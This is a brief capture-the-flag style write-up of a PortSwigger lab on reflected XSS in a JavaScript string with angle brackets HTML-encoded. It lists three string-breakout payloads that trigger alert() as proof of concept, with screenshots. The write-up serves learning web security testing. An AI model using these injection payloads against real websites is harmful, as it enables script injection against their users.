**Reflected XSS into a JavaScript string with angle brackets HTML encoded**

Look like we are inside a string
Need to break out
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9159ee50-aa6d-4f2b-810f-4a97c46588c6)



Using 
```
ArbitaryWord';alert();'
``` 
We are able to break out
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/89a08ff2-8775-4464-9c42-cfbe007eb5af)





Another payload
```
viet';alert();let myvar='test
```
We got a POC
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/30fefe4b-5932-4968-8528-0dc79c635c79)



We can also use payload 
```
'-alert(1)-'
```

From <https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded> 






